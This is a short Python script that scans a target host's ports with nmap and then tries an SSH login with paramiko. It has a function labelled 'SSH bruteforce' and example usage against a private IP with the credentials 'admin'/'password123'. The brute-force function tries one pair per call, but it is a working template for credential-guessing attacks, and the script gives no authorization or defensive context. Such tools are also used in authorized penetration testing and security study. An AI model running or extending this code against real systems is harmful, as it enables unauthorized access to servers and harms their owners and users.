import nmap
import paramiko

# Nmap scan function
def nmap_scan(target_ip):
    nm = nmap.PortScanner()
    nm.scan(target_ip, '22-443')
    return nm.csv()

# SSH bruteforce function
def ssh_bruteforce(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, username=username, password=password)
        print(f'SSH login successful: {username}:{password}')
        return True
    except paramiko.AuthenticationException:
        print(f'SSH login failed: {username}:{password}')
        return False

# Example usage
target_ip = '192.168.1.100'
nmap_results = nmap_scan(target_ip)
print(nmap_results)

username = 'admin'
password = 'password123'
ssh_bruteforce(target_ip, username, password)
